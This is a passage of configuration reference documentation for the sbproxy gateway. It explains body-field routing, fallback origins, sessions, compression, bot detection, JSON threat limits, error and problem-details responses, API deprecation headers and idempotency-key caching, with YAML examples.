The `body` matcher routes on a field inside a JSON request body. The field an operator most wants to route on is often in the body rather than the URL: `model`, `stream`, and `tools` are body fields in the common LLM request shapes, so without this matcher two models cannot get different rate limits, different upstream credentials, or different guardrail chains without collapsing onto one origin.

```yaml
forward_rules:
  - rules:
      - body:
          pointer: /model
          prefix: gpt-
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `pointer` | string | required | RFC 6901 JSON Pointer to the field, e.g. `/model` or `/messages/0/role`. Must be empty or start with `/`; a bare field name such as `model` fails config load. `~1` decodes to `/` and `~0` to `~`. The empty pointer addresses the whole document. |
| `value` | string | | The resolved value must equal this exactly. Wins over `prefix` when both are set. |
| `prefix` | string | | The resolved value must start with this. Ignored when `value` is set. |
| `max_bytes` | int | 65536 | Largest request body the matcher reads, in bytes. 65536 is also the hard ceiling: it is the size of the replay buffer that lets a body read during route selection still be forwarded upstream, so config load rejects a larger value. `0` is also rejected, since it could never match anything. |

When neither `value` nor `prefix` is set, the matcher succeeds whenever the pointer resolves to any JSON value at all, including `null`, an object, or an array. That is how you route on "this request declares tools" (`pointer: /tools`) without naming one. Numbers and booleans compare against their JSON text form, so `pointer: /stream` with `value: "true"` matches `{"stream": true}`. A `value` or `prefix` comparison against a field that resolves to an object or array is a miss, not an error.

**Buffering.** Selecting a route on a body field means the body must be read before the route is known. An origin whose forward rules declare at least one body matcher buffers up to the largest `max_bytes` among them before route selection; every buffered byte is replayed upstream unchanged, so routing on the body does not consume the body. Origins with no body matcher never buffer, read, or parse anything for this feature. There is no content-type gate: the buffered bytes are parsed as JSON regardless of the request's `Content-Type` header.

**Misses, not failures.** Five conditions make a body matcher miss rather than fail the request: a body larger than `max_bytes` (whether declared by `Content-Length` up front or discovered while reading a chunked body), a body that is not JSON, a body that does not parse, a pointer that resolves to nothing, and a pointer that resolves to an object or array while `value` or `prefix` expects a scalar. In every case the entry does not fire and evaluation moves to the next entry, then the next rule, then the origin's own action, which is the same routing the request would have received without the matcher. A body matcher only ever selects a route; it never rejects a request.

Within one entry the body matcher is ANDed with any `method`, `path`, `header`, and `query` matchers present, and it is evaluated last because it is the only matcher that reads buffered bytes. A worked example routing one model family to its own pool while everything else takes the origin's default action:

```yaml
origins:
  "llm.example.com":
    action:
      type: proxy
      url: https://general-pool.internal:8080
    forward_rules:
      # Chat requests whose body names a gpt-4o family model go to the
      # dedicated pool. Path and body sit in one entry, so both must hold.
      - rules:
          - path:
              prefix: /v1/chat/completions
            body:
              pointer: /model
              prefix: gpt-4o
        origin:
          id: gpt-4o-pool
          action:
            type: proxy
            url: https://gpt4o-pool.internal:8080
```

Requests to any other path, requests whose `model` names a different family, and requests whose body the matcher cannot read all proxy to `general-pool.internal`. For a runnable configuration, see [`examples/body-routing/`](../examples/body-routing/).

### Forward rule fields

The forward rule itself wraps the matcher list and the inline child origin to dispatch to.

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `rules` | list | `[]` | Matcher entries. The rule fires when any one matches. |
| `origin` | object | required | Inline child origin. See below. |
| `deprecation` | object | | RFC 9745 / RFC 8594 deprecation announcement for the requests this rule matches. Overrides the origin-level block for them. Same fields as [API deprecation](#api-deprecation-rfc-9745--rfc-8594). |

The `origin` object is a full child origin config plus identifying metadata:

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `id` | string | | Identifier surfaced in metrics and logs. |
| `hostname` | string | | Informational hostname tag. The parent origin's hostname is what routed the request. |
| `workspace_id` | string | | Workspace identifier. |
| `version` | string | | Version label. |
| `action` | object | required | Action executed when the rule fires. Same schema as a top-level `action`. |
| `request_modifiers` | list | `[]` | Request modifiers applied before the action runs. |

### Inline origins

Forward rules embed full origin configurations via the `origin` field. Each inline origin can have its own action, authentication, policies, and transforms, exactly like a top-level origin.

```yaml
forward_rules:
  - rules:
      - path:
          prefix: /admin/
    origin:
      id: admin
      action:
        type: proxy
        url: https://admin-backend.internal:8080
      authentication:
        type: basic_auth
        users:
          - username: admin
            password: ${ADMIN_PASSWORD}
      policies:
        - type: rate_limiting
          requests_per_minute: 30
```

---

## Fallback origin

When the primary action errors or the upstream returns a configured status code, the proxy can swap in a backup origin. The fallback runs the action you'd normally write at the top level (static, redirect, mock, proxy, anything), so you can serve a cached body, redirect to a status page, or route to a degraded backend.

```yaml
origins:
  "api.local":
    action:
      type: proxy
      url: https://primary-backend:8080

    fallback_origin:
      on_error: true
      on_status: [502, 503, 504]
      add_debug_header: true
      origin:
        id: degraded-stub
        action:
          type: static
          status: 200
          content_type: application/json
          json_body:
            status: degraded
            message: primary upstream temporarily unavailable
            retry_after_secs: 30
```

### Trigger fields

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `on_error` | bool | false | Trigger the fallback on transport-level upstream failures (DNS, connect, TLS, timeout). Not triggered for an AI request the gateway cancelled because the caller's connection broke: there is no caller left to serve, and on an `ai_proxy` fallback the substitute action would be a second paid provider call. See [ai-gateway.md](ai-gateway.md#when-a-broken-connection-stops-the-meter). |
| `on_status` | list[int] | `[]` | Trigger the fallback when the upstream responds with one of these status codes. Pair with `on_error` for full coverage. |
| `add_debug_header` | bool | false | When true, the proxy sets `X-Fallback-Trigger` on the response so callers can tell the fallback path served the request. |
| `origin` | object | required | Inline origin spec used to serve the request when a trigger fires. Must contain an `action` block. `id` is optional and is used to name the rule in emitted OpenAPI operation ids. `hostname`, `workspace_id`, and `version` are refused at config compile: nothing read them. |

### Inline origin

The `origin:` field carries the same action types as a top-level origin (proxy, static, redirect, mock, echo, beacon, noop, ai_proxy, load_balancer, websocket, grpc). Authentication, policies, and transforms are not applied to the fallback path; only the action runs. If you need richer behavior from the fallback, point its action at another origin via `proxy` and let the host router apply that origin's full chain.

---

## Variables, vaults, and secrets

### Variables

User-defined key-value pairs available in template context as `{{ variables.name }}`. Any JSON type works, including nested objects.

```yaml
origins:
  "api.example.com":
    variables:
      api_version: v2
      base_url: https://api.example.com
      feature_flags:
        new_ui: true
        beta_api: false
    action:
      type: proxy
      url: "{{ variables.base_url }}/{{ variables.api_version }}"
```

### Secret references

Declare named backends under `proxy.secrets.backends` and place a provider URI
directly in a secret-bearing field. The legacy `backend`, `hashicorp`, `map`, and
`fallback` fields remain parseable but are config-only. `rotation` is live: see
[Secret rotation](#secret-rotation). See also
[Secrets](#secrets) and [the secrets guide](secrets.md).

### Template scopes

Templates have access to these scopes:

| Scope | Description | Example |
|-------|-------------|---------|
| `request` | Current HTTP request | `{{ request.headers.x_api_key }}` |
| `variables` | User-defined variables | `{{ variables.api_version }}` |
| `secrets` | Loaded secrets | `{{ secrets.api_token }}` |
| `config` | Config metadata | `{{ config.hostname }}` |
| `session` | Session data | `{{ session.auth.email }}` |
| `env` | Config identity fields | `{{ env.workspace_id }}` |
| `server` | Server-level vars | `{{ server.var_name }}` |

---

## Session config

Configure session behavior for an origin. Sessions are stored in encrypted cookies.

```yaml
origins:
  "app.example.com":
    session:
      cookie_name: sb_session
      max_age: 3600
      same_site: Strict
      http_only: true
      secure: true
      allow_non_ssl: false
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `cookie_name` | string | | Session cookie name |
| `max_age` | int | | Cookie lifetime in seconds. Alias: `cookie_max_age`. |
| `http_only` | bool | false | Set the `HttpOnly` cookie attribute |
| `secure` | bool | false | Set the `Secure` cookie attribute (HTTPS only) |
| `same_site` | string | | SameSite attribute (`Strict`, `Lax`, `None`). Alias: `cookie_same_site`. |
| `allow_non_ssl` | bool | false | Allow sessions over plain HTTP |

Sessions disable themselves implicitly when the block is omitted.

A session cookie is minted when the caller sends none, and the proxy
appends it as a `Set-Cookie`. If this origin also enables
`response_cache`, a stored entry can replay that cookie to a later
caller, which means two callers share one session. Read
[Who a cached entry belongs to](#who-a-cached-entry-belongs-to) before
combining the two.

---

## Compression

Configure response compression on a per-origin basis.

```yaml
origins:
  "api.example.com":
    compression:
      enabled: true
      algorithms: [br, gzip]
      min_size: 512
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | true | Master switch. Alias: `enable`. |
| `algorithms` | list | | Allowed algorithms in priority order (e.g. `["br", "gzip"]`). Valid entries are `zstd`, `br`, and `gzip`; anything else fails config load. |
| `min_size` | int | 0 | Minimum response size in bytes before compression is applied |
| `level` | int | | Encoder effort, clamped into the negotiated algorithm's range (gzip 0-9, brotli 0-11, zstd 1-22). Unset keeps each library's default. |

`algorithms` is a priority order, not a set. The list is walked as
authored and the first entry the client's `Accept-Encoding` accepts is
the one served, so `algorithms: [gzip, br]` sends gzip to a browser that
accepts both, which is what you want when something downstream caches on
`Content-Encoding`. Leave the list empty to take the built-in order,
best ratio first: `zstd`, then `br`, then `gzip`.

Client quality values are honored as refusals per RFC 9110 §12.5.3.
`Accept-Encoding: gzip;q=0` means gzip is not acceptable to that client
and the proxy will not send it, and the standard opt-out
`Accept-Encoding: identity;q=1, *;q=0` gets an uncompressed response.
A `*` stands in only for codings the header does not name on its own, so
`gzip, *;q=0` is a gzip-only request.

---

## HSTS

Inject the `Strict-Transport-Security` header on responses.

```yaml
origins:
  "secure.example.com":
    hsts:
      max_age: 31536000
      include_subdomains: true
      preload: true
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `max_age` | int | 31536000 | `max-age` directive in seconds |
| `include_subdomains` | bool | false | Emit the `includeSubDomains` directive |
| `preload` | bool | false | Emit the `preload` directive |

---

## Connection pool

`origins.*.connection_pool` is retained for config compatibility, and one
field in it is live. `idle_timeout_secs` is the legacy spelling of
`timeouts.idle_ms` (in seconds) and feeds the same resolved idle deadline
when `timeouts.idle_ms` is unset. Setting both fails config compile; prefer
`timeouts.idle_ms` in new configs.

The other two fields fail config compile. Neither was ever applied, and
neither has anything behind it to apply:

- `max_connections` never capped upstream connections. The upstream
  keepalive pool is sized once for the process rather than per origin, so
  a per-origin number had nowhere to go. To bound how many requests an
  origin has in flight, add a `concurrent_limit` policy, which is enforced
  per request and rejects over the cap instead of queueing.
- `max_lifetime_secs` never retired a connection. The pool has no
  age-based eviction, so a long-lived upstream connection outlived this
  deadline indefinitely. The deadline that does retire pooled connections
  is the idle one, `timeouts.idle_ms`.

Both were accepted with a boot warning in earlier releases. They are
refused now because a limit that parses and does not limit reads as a
limit that holds.

---

## Upstream timeouts

`origins.*.timeouts` sets the transport deadlines the proxy applies when it
connects to and exchanges bytes with this origin's upstreams. Every field is
optional and every value is in milliseconds; an omitted field keeps its
built-in default.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal:8080
    timeouts:
      connect_ms: 2000
      total_connect_ms: 5000
      read_ms: 60000
      write_ms: 30000
      idle_ms: 30000
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `connect_ms` | int | 5000 | Deadline for one upstream TCP connect attempt. |
| `total_connect_ms` | int | 10000 | Deadline across all connect attempts for one upstream selection, including TLS. |
| `read_ms` | int | 30000 | Per-read socket deadline on the upstream connection. A response that stalls longer than this between reads fails with an upstream read timeout. |
| `write_ms` | int | 30000 | Per-write socket deadline on the upstream connection. |
| `idle_ms` | int | 90000 | How long a pooled upstream connection may sit idle before it is closed. |

A `0` in any field fails config compile. A zero deadline fails the operation
the moment it starts, which is never what was intended; omit the field to
keep its default.

When the origin's proxy action enables [service discovery](#service-discovery),
the proxy caps the effective idle deadline at half the DNS refresh window
(at most 10 seconds) so a pooled connection cannot outlive an IP rotation.
That cap is a correctness bound: the proxy uses the smaller of `idle_ms` and
the cap, so a configured value can shorten the idle deadline further but
never extend it past the cap.

Inline origins under `forward_rules` have no `timeouts` block of their own.
Requests routed through a forward rule use the parent origin's resolved
timeouts.

`connection_pool.idle_timeout_secs` is the legacy spelling of `idle_ms`, in
seconds. It still works when `timeouts.idle_ms` is unset; setting both fails
config compile. See [Connection pool](#connection-pool).

---

## Bot detection

Bot detection blocks requests based on `User-Agent` substring matches. The deny list rejects user agents that contain any of the listed substrings (case-insensitive). The allow list exempts user agents from the deny check, so trusted crawlers can pass through even when their substring is otherwise denied.

```yaml
origins:
  "api.example.com":
    bot_detection:
      enabled: true
      mode: block
      deny_list:
        - badbot
        - scrapy
        - python-requests
      allow_list:
        - Googlebot
        - bingbot
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | false | Master switch. When false, every request is admitted. |
| `mode` | string | | Mode hint (`block`, `log`). Currently informational; the runtime always blocks denied agents. |
| `deny_list` | list | `[]` | User-Agent substrings (case-insensitive) that are blocked with 403. |
| `allow_list` | list | `[]` | User-Agent substrings (case-insensitive) that bypass the deny check. Evaluated before the deny list. |

---

## Threat protection

Threat protection guards against pathological JSON request bodies. When the request `Content-Type` is `application/json`, the proxy parses the body and checks it against limits on nesting depth, key count, string length, array size, and total body size. A request that exceeds any limit is rejected before it reaches the upstream.

The `body_threat_protection` *policy* ([api-security.md](api-security.md#structural-body-threat-limits)) is the successor surface for this job: it adds XML limits with a DTD refusal, returns a 400 naming the violated limit instead of a blanket 413, and has an observe-only `tap` mode. Prefer the policy for new configs; this origin-level block remains for existing ones.

One knob does not carry over. The policy has no body-size limit of its own, so an origin that sets `json.max_total_size` here and then deletes this block for the policy silently widens its body cap to the proxy's 8 MiB buffering bound. Move the value to `request_limit.max_body_size` before removing `threat_protection:`.

```yaml
origins:
  "api.example.com":
    threat_protection:
      enabled: true
      json:
        max_depth: 32
        max_keys: 1000
        max_string_length: 65536
        max_array_size: 10000
        max_total_size: 1048576
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | false | Master switch for threat checks on this origin. |
| `json` | object | | JSON-specific limits applied when the body is `application/json`. Omitting this block disables JSON checks even when `enabled` is true. |
| `json.max_depth` | int | unlimited | Maximum nesting depth across objects and arrays. |
| `json.max_keys` | int | unlimited | Maximum number of keys in any single object. |
| `json.max_string_length` | int | unlimited | Maximum length of any single string value. |
| `json.max_array_size` | int | unlimited | Maximum length of any single array. |
| `json.max_total_size` | int | `8388608` | Maximum total body size in bytes, enforced while the body streams in and before parsing. A body past the cap is rejected with `413`, so proxy memory for the scan is bounded by the cap. Unset takes the proxy's 8 MiB buffering hard cap; the same bound applies to the body-validation buffer used by `request_validator`, `openapi_validation`, `content_digest`, `body_threat_protection`, and body-aware `prompt_injection_v2`. |

---

## Error pages

Error pages let you replace the error responses the proxy itself generates with operator-defined bodies. A status the upstream returned is relayed as the upstream wrote it and never runs through this table. Each entry declares the status codes it covers, the `Content-Type` it produces, and the response body. When more than one entry matches the status code, the proxy performs `Accept` header content negotiation across the candidates and picks the highest-quality match. With no concrete preference it prefers `application/json`, then `text/html`, then the first candidate.

The block is a list at the origin level. Each entry's `status` field accepts a single integer or a list of integers. When `template` is true, the body is rendered with `{{ status_code }}` and `{{ request.path }}` substituted at request time.

`error_pages` and `problem_details` share one emitter, so they cover the same set of errors and an authored page always wins over the renderer. [What the renderer covers](#what-the-renderer-covers) below is the list for both.

```yaml
origins:
  "api.example.com":
    error_pages:
      - status: [502, 503, 504]
        content_type: text/html; charset=utf-8
        template: true
        body: |
          <h1>Service unavailable</h1>
          <p>Status {{ status_code }} on {{ request.path }}.</p>
      - status: [502, 503, 504]
        content_type: application/json
        template: true
        body: '{"error":"upstream_unavailable","status":{{ status_code }},"path":"{{ request.path }}"}'
      - status: 404
        content_type: application/json
        body: '{"error":"not_found"}'
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `status` | int or list | | Status code or list of status codes this entry covers. Required for the entry to match. |
| `content_type` | string | `application/json` | `Content-Type` header sent with the response. |
| `body` | string | `""` | Response body. May contain template placeholders when `template` is true. |
| `template` | bool | false | When true, substitute `{{ status_code }}` and `{{ request.path }}` in the body. Both spaced and unspaced forms are accepted. |

---

## Problem details (RFC 9457)

The `problem_details` block opts the origin into RFC 9457
`application/problem+json` responses for proxy-generated errors that are
not matched by an `error_pages` entry. The two blocks compose: per-status
custom pages still win when authored; `problem_details` catches the rest
with a structured body.

```yaml
origins:
  "api.example.com":
    error_pages:
      - status: 401
        content_type: application/json
        body: '{"error":"unauthorized","hint":"set X-Api-Key"}'

    problem_details:
      enabled: true
      type_base_uri: "https://api.example.com/errors"
      include_detail: true
```

A denial on this origin with a status other than 401 (no `error_pages`
entry matches it) renders as:

```json
{
  "type": "https://api.example.com/errors/403",
  "title": "Forbidden",
  "status": 403,
  "detail": "authentication failed",
  "instance": "/get"
}
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | false | When true, render unmatched proxy-generated errors as `application/problem+json`. |
| `type_base_uri` | string | | Base URI for the `type` field; the status code is appended (e.g. `https://api.example.com/errors/503`). When unset the renderer emits the RFC 9457 default `about:blank`. |
| `include_detail` | bool | true | When false, the `detail` field is suppressed (operators can avoid leaking internal error text). |

See [`examples/problem-details/`](https://github.com/soapbucket/sbproxy/tree/main/examples/problem-details).

Spec: <https://www.rfc-editor.org/rfc/rfc9457.html>.

### What the renderer covers

`problem_details` sits behind `error_pages` on the same emitter, so
anything below that no authored page matches renders as problem+json:

- **Authentication denials**: a bad API key, a failed JWT check,
  `forward_auth` rejecting a request, a Basic or plugin denial that also
  carries a `WWW-Authenticate` challenge. The challenge header survives
  the rendered body.
- **Policy denials** from the origin's `policies:` chain that do not
  author their own response: `ip_filter`, `waf`, `dlp`, `csrf`, `rego`,
  `expression`, `object_authz`, `request_limit`, `http_framing`,
  `exposed_credentials`, `semantic_constraint`, and `agent_budget`.
- **Upstream failures** (connect refused, connect timeout, TLS
  handshake errors, mid-stream connection loss) routed through
  Pingora's `fail_to_proxy` path. The `detail` field carries the
  RFC 9209 error token (`connection_refused`,
  `connection_timeout`, `tls_protocol_error`, `connection_terminated`,
  `http_request_error`, `credential_provider_locked`) so downstream
  tooling can break down by failure mode without scraping the body.
  `credential_provider_locked` is the one token that is not an upstream
  failure: it means the calling credential's provider policy excluded
  every tier of an AI cascade. It carries no policy contents, so a
  caller cannot learn from it which providers exist behind the gateway.

### What it does not cover

These keep their own response shapes, and turning `problem_details` on
does not change them:

- **Denials whose body is pinned by a protocol**: rate limiting and DDoS
  (429 with the `RateLimit-*` set), the AI-crawl family (402 payment
  challenge, 403 content-signal refusal, 406 rail negotiation, 503
  ledger unavailable), settlement responses, agent-to-agent chain
  refusals, and any policy that authored its own body and media type.
  The wire format is part of those specs, so a generic envelope would
  break the client that reads them.
- **Policies that write their own body on every refusal**:
  `concurrent_limit`, `content_digest`, and `prompt_injection_v2`. Each
  carries an operator-settable body (`error_body` /
  `error_content_type`, `block_body` / `block_content_type`) and emits
  it, or its own JSON default, straight to the client. The knob the
  operator already has for those three is the body itself, so the
  renderer stays out of the way rather than overwriting it.
- **The default 404 for an unmatched `Host`**. No origin resolved, so
  there is no `problem_details` block to read.
- **Refusals that run before the policy chain**: `bot_detection`'s 403,
  the 405 for a method the origin does not allow, and the built-in
  well-known and callback endpoints. Those answer from their own
  emitters, ahead of the point where the origin's error configuration is
  consulted.
- **The `digest` challenge 401** and the 429 a `cap` credential gets for
  exhausting its own budget. Both write their headers and body in one
  piece from their own emitters.
- **AI gateway surface errors** (`/v1/chat/completions` and the rest of
  the AI dispatch path). Those answer from their own emitters: some in
  the provider's `{"error": {...}}` envelope so an SDK's error handling
  still works, the rest as a flat `{"error": "..."}`. Neither reads the
  origin's `error_pages` or `problem_details`.
- **Upstream-returned status codes**. A 500 the backend produced is
  relayed as the backend wrote it; the renderer only shapes errors the
  proxy itself generates.

`include_detail: false` suppresses `detail` on everything the renderer
does cover, which includes the WAF message that names the matched rule
id.

---

## API deprecation (RFC 9745 + RFC 8594)

The `deprecation` block announces that a route is going away, on the
wire, where clients and SDKs can see it. Responses from a covered route
carry the standard headers:

- `Deprecation: @1788220800` (RFC 9745, an RFC 9651 structured-field
  Date; past means "was deprecated", future means "will be")
- `Sunset: Thu, 31 Dec 2026 23:59:59 GMT` (RFC 8594, when the resource
  is expected to stop responding)
- `Link: <url>; rel="successor-version"` (RFC 5829, where to migrate)
- `Link: <url>; rel="deprecation"` (RFC 9745, human documentation)

The block is accepted at two scopes. On the origin it covers every
route the origin serves. On a forward rule it covers only requests
that rule matches and overrides the origin block for them, which is
how `/v1/*` gets deprecated while `/v2/*` on the same origin stays
clean. The headers ride proxied and locally generated (`static`,
`mock`, `redirect`) responses alike.

```yaml
origins:
  "api.example.com":
    action:
      type: proxy
      url: https://backend.internal
    forward_rules:
      - rules:
          - path: { prefix: /v1/ }
        deprecation:
          deprecated: 2026-09-01
          sunset: 2026-12-31T23:59:59Z
          successor: https://api.example.com/v2/
          link: https://developer.example.com/deprecation
          after_sunset: serve        # or: gone
        origin:
          id: v1-legacy
          action: { type: proxy, url: https://legacy.internal }
      - rules:
          - path: { prefix: /v2/ }
        origin:
          id: v2
          action: { type: proxy, url: https://backend.internal }
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `deprecated` | date or bool | | When the route is (or will be) deprecated: `2026-09-01` or `2026-09-01T00:00:00Z`. Emits `Deprecation: @<unix>`. A bare `true` marks the route deprecated for OpenAPI emission and metrics but emits no header, because RFC 9745 requires a date value; config load warns and suggests one. `false` fails config load: remove the block instead. |
| `sunset` | date | | When the route is expected to stop responding. Emits `Sunset: <HTTP-date>`. Must not be earlier than `deprecated`; config load refuses that per RFC 9745. |
| `successor` | URL | | Where callers migrate to. Emits `Link: <url>; rel="successor-version"`. |
| `link` | URL | | Human-readable deprecation documentation. Emits `Link: <url>; rel="deprecation"`. |
| `after_sunset` | string | `serve` | Posture once `sunset` passes. `serve` keeps handling requests with the headers attached. `gone` refuses them with `410 Gone` and a JSON body naming `successor` and `link`, headers still attached. Requires `sunset`. |

At least one of `deprecated` or `sunset` must be set. Dates are
`YYYY-MM-DD` (midnight UTC) or RFC 3339 timestamps.

Announcing is half the job; the other half is finding who has not
migrated. Every request that resolves to a deprecated route increments

```
sbproxy_deprecated_requests_total{origin, route, past_sunset, outcome}
```

where `rule` is the forward rule's `origin.id` (or its index), the
OpenAPI path template for a spec-driven match, or empty for a
whole-origin block, and `past_sunset` flips to `true` once the sunset
instant passes. A dashboard on that counter is the migration tracker.

Two boundary notes. Header stamping covers proxied responses and the
locally generated response actions (`static`, `mock`, `echo`,
`beacon`, `redirect`); `ai_proxy` and `mcp` responses follow the same
posture those actions have for the rest of the response-phase surface
and are not stamped, though the counter and the `gone` refusal still
apply to them. And a response served from the response cache replays
the headers it was stored with but does not increment the counter,
because a cache hit answers before the route is resolved; on a cached
route the counter undercounts by the hit rate.

The announcement also reaches the emitted OpenAPI document: operations
on a deprecated route are marked `deprecated: true` with
`x-sbproxy-sunset` and `x-sbproxy-successor` extensions carrying the
same values as the wire headers. See
[openapi-emission.md](openapi-emission.md). For the reverse direction,
emitting headers on operations an uploaded spec already marks
deprecated, see the `deprecation_headers` sub-block on
[openapi_validation](#openapi_validation).

Specs: <https://www.rfc-editor.org/rfc/rfc9745.html>,
<https://www.rfc-editor.org/rfc/rfc8594.html>,
<https://www.rfc-editor.org/rfc/rfc5829.html>.

See [`examples/api-deprecation/`](https://github.com/soapbucket/sbproxy/tree/main/examples/api-deprecation).

---

## Idempotency

The `idempotency:` block opts the origin into cached retries per
`draft-ietf-httpapi-idempotency-key-header`. The middleware reads the
`Idempotency-Key` request header,
hashes the request body, and:

- **First call** under a given key: claims the key, forwards the
  request upstream, and caches the response under
  `(tenant, origin, key)` keyed by the body hash. Two origins never see
  each other's entries, including on the `redis` backend where they
  share one store.
- **Replay** with the same key + same body: returns the cached
  response with `x-sbproxy-idempotency: HIT`. The upstream is not
  contacted.
- **Conflict** (same key, different body): returns 409 with the
  `ledger.idempotency_conflict` JSON body and
  `x-sbproxy-idempotency: CONFLICT`.
- **Overlap** (a second request arrives while the first is still
  running): waits for the first request's response and replays it. If
  the first request has not finished within `claim_wait_ms`, the second
  gets 409 with `ledger.idempotency_in_flight`,
  `x-sbproxy-idempotency: IN-FLIGHT`, and `Retry-After: 1`. It never
  reaches the upstream.

The `x-sbproxy-idempotency` response header carries one of `HIT`,
`CONFLICT`, `IN-FLIGHT`, `SKIPPED-OVERSIZE-REQUEST`,
`SKIPPED-OVERSIZE-RESPONSE`, `SKIPPED-POOL-FULL`, or
`SKIPPED-MULTIPART`. A first call that goes upstream carries no marker.

`SKIPPED-MULTIPART` is the one that surprises people: a multipart
request bypasses the cache because the v1 cache stores raw bytes, and a
client retry may regenerate its MIME boundaries, so two byte-identical
uploads hash differently and would read as a conflict rather than as a
replay. Nothing is cached and the request goes upstream.

The middleware runs ahead of policy enforcement so a cached replay
does not consume a rate-limit slot.

### Overlapping requests reach the upstream once

A client that times out locally and fires fifty retries of one POST
produces one upstream call and fifty identical responses. The key is
claimed, not merely looked up, so only the request holding it goes
upstream; the rest wait on that claim and replay its answer.

The claim is a lease, held for `claim_lease_secs` (sixty by default).
A request that finishes, fails, or is cancelled releases the key
immediately, so the next retry proceeds without waiting. A process that
dies mid-request cannot release anything, and its key is takeable again
once the lease runs out: the lease is the bound on how long one crashed
request can make one key answer 409, and nothing else.

Size it above the slowest response this origin produces. An upstream
that routinely takes longer than the lease can have a retry take the
key over while the original is still running, which is one duplicate
call per overlap. The default is sized for the slow tail of a normal
API call; an origin fronting an AI completion, a long-poll, or a
payment with a 3DS step-up wants a larger value.

The lease and the response TTL are two different lifetimes. A response
is stored under `ttl_secs`, which is hours, and it is written whether
or not the claim row survived: an upstream slower than the lease still
caches its answer, so the client's next retry is a replay rather than
another call. What the lease governs is who gets to write. A request
that stalled past its lease and was replaced cannot overwrite the
answer its successor already sent, and a refusal on those grounds is
counted under `result="fenced"`.

A request that arrives during an overlap and carries a *different*
body still gets `ledger.idempotency_conflict` rather than a replay: the
body hash is compared against the response that eventually lands, so a
key reused with different content is never answered with somebody
else's result.

Two exceptions worth knowing. Requests on a GraphQL origin with
validation enabled engage idempotency after validation, at a point in
the pipeline that cannot wait, so an overlap there answers
`ledger.idempotency_in_flight` immediately instead of waiting out
`claim_wait_ms`. And single-flight across replicas needs a store that
can create a key atomically: `redb`, `sqlite`, and `redis` all can, and
so does the in-memory backend within one process. If `proxy.l2_store`
points at a backend that cannot, the proxy warns once at startup naming
the store, counts every affected request under
`sbproxy_idempotency_cache_results_total{result="single_flight_unsupported"}`,
and falls back to replay-only behavior rather than pretending.

A request that is waiting on somebody else's claim holds a slot in its
own pool, sized by `max_concurrent_buffers` but separate from the
buffering pool. Worst-case memory per origin is therefore roughly
`2 * max_concurrent_buffers * max_request_body_bytes`. The two are
separate because they bound different things: buffering is microseconds
on the way upstream, while a wait is up to `claim_wait_ms` of doing
nothing, and one shared pool let a retry storm on a single key spend
every slot the origin had.

### Reading the metrics

Every request the middleware *resolves* lands exactly one *outcome*
value on `sbproxy_idempotency_cache_results_total{backend,result}`, so
those values sum to the number of requests the middleware resolved:

| `result` | What happened |
|---|---|
| `not_applicable` | No idempotency key on the request. |
| `miss` | This request took the key and went upstream. |
| `takeover` | The same, on a key whose previous holder never came back. |
| `hit` | A stored response was replayed. |
| `coalesced` | A stored response was replayed after waiting for the request producing it. One upstream call served both. |
| `conflict` | Same key, different body. Answered 409 `ledger.idempotency_conflict`. |
| `wait_timeout` | The wait budget ran out while the holder was still working. Answered 409 `ledger.idempotency_in_flight`. |
| `abandoned` | The holder ended without storing a response. Same 409, and the client's retry is what takes the key over. |
| `in_flight` | A live claim was found by a request that cannot wait for it, so no wait was attempted. Answered 409 `ledger.idempotency_in_flight` immediately. Two populations: the GraphQL late path, which has already committed the body, and a request that could not take a waiter slot because the waiter pool was full. |

Three further values are diagnostic and are counted *in addition* to
the outcome, so they do not sum with the table above:

| `result` | What happened |
|---|---|
| `error` | A store-side read or write failed. The numerator for "the cache is not working". |
| `fenced` | A publish was refused because another request owns the key or has already answered it. |
| `single_flight_unsupported` | The configured store has no atomic create, so overlapping first requests are not serialized. |

That denominator is not the origin's request count, and the difference
matters when you build the dashboard. A request the middleware **skips**
records nothing at all: an oversize request or response body, a
multipart body, and a full buffering pool each go upstream uncached and
appear only as an `x-sbproxy-idempotency: SKIPPED-*` response header.
A request with **no idempotency key** records `not_applicable` on the AI
proxy path, which sees the whole body before it decides, and records
nothing on the streaming proxy path, which never engages the middleware
for a keyless request. So `sum(rate(...))` is the middleware's own
throughput, not the origin's, and `not_applicable` counts keyless AI
requests only.

A nonzero `takeover` or `abandoned` rate means requests are dying
between claiming a key and answering it. A nonzero `wait_timeout` means
overlapping retries are outliving `claim_wait_ms`. A nonzero `fenced`
rate means responses are arriving after their lease lapsed, which is
the signal to raise `claim_lease_secs`.

```yaml
origins:
  "api.example.com":
    idempotency:
      enabled: true
      header_name: Idempotency-Key  # default
      ttl_secs: 86400               # default (24 h)
      methods: [POST, PUT, PATCH]   # default
      backend: memory               # or `redis`
      claim_lease_secs: 60          # default
      claim_wait_ms: 3000           # default
```

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `enabled` | bool | false | When true, the middleware engages on this origin. |
| `header_name` | string | `Idempotency-Key` | Request header carrying the key. |
| `ttl_secs` | int | 86400 | Cache entry TTL in seconds. |
| `methods` | list | `[POST, PUT, PATCH]` | HTTP methods that engage the middleware. Other methods pass through. |
| `backend` | enum | `memory` | `memory` (per-origin, per-replica) or `redis` (binds to `proxy.l2_cache_settings`, alias `l2_cache`, for cluster-wide replay). |
| `max_request_body_bytes` | int | 1048576 (1 MiB) | Per-request cap on buffered body bytes. Bodies larger than this skip the cache; response carries `x-sbproxy-idempotency: SKIPPED-OVERSIZE-REQUEST`. |
| `max_response_body_bytes` | int | 1048576 (1 MiB) | Per-response cap on cached body bytes. Responses larger than this stream through uncached. |
